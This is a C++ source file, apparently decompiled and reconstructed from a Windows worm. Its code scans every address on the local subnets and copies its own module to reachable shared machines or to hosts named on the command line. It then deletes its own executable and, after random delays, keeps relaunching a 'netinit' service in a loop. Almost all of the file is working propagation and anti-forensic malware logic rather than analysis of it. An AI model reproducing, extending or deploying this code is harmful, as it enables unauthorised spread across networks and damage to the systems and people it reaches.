/******************************************************************************************
  Copyright 2013 Christian Roggia

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.
******************************************************************************************/

// MODIFIED BY mic.ric.tor
#include "4.h"
#include "0.h"
#include "3.h"
#include "Service.h"

using namespace sc::service;

bool WriteModuleOnSharedNetwork()
{
	struct in_addr in; // [sp+14h] [bp-1FCh]@8
	struct WSAData WSAData; // [sp+20h] [bp-1F0h]@4
	WCHAR szPC_IP[20]; // [sp+1B0h] [bp-60h]@11
	char szHostname[50]; // [sp+1D8h] [bp-38h]@4
	
	if(!g_argv)
		return false;
	
	strset(szHostname, 0, 50);
	if(WSAStartup(257, &WSAData))
	{
		WSACleanup();
		return false;
	}
	
	gethostname(szHostname, 50);
	struct hostent *sHost = gethostbyname(szHostname);
	
	DWORD dwCurrentAddr;
	char **szAddrList;
	for(szAddrList = sHost->h_addr_list, dwCurrentAddr = 0; *szAddrList, dwCurrentAddr < 10; szAddrList = &sHost->h_addr_list[dwCurrentAddr++])
	{
		strcpyW((WCHAR *)&in.S_un.S_un_b.s_b1, (const WCHAR *)*szAddrList, sHost->h_length);
		
		UINT8 b8CurrentLastIpByte = in.s_impno, b8LastIpByte = 1;
		do
		{
			if(b8CurrentLastIpByte != b8LastIpByte)
			{
				in.s_impno = b8LastIpByte;
				
				if(strlen(inet_ntoa(in)) <= 19)
				{
					btowc(inet_ntoa(in), szPC_IP, strlen(inet_ntoa(in)));
					WriteModuleOnSharedPC(g_module_path, szPC_IP);
				}
			}
		}
		while(++b8LastIpByte < 255);
	}
	
	WSACleanup();
	ForceFileDeletion(g_argv[0]); // delete itself
	
	return true;
}

bool WriteModuleOnSharedPCByArgv()
{
	if(g_argv)
	{
		for(int i = 1; i < g_argc; ++i)
			WriteModuleOnSharedPC(g_module_path, g_argv[i]);
		
		return true;
	}
	
	return false;
}

DWORD RunServiceNetinit(LPVOID lpThreadParameter)
{
	SvcSleep(GetRandom() % 60 + 120);
	while(!bSvcStopped)
	{
		EnterCriticalSection(&g_critical_section);
		TryToRunServiceNetinit(L"1");
		LeaveCriticalSection(&g_critical_section);
		
		SvcSleep(GetRandom() % 60 + 120);
	}
	
	return 0;
}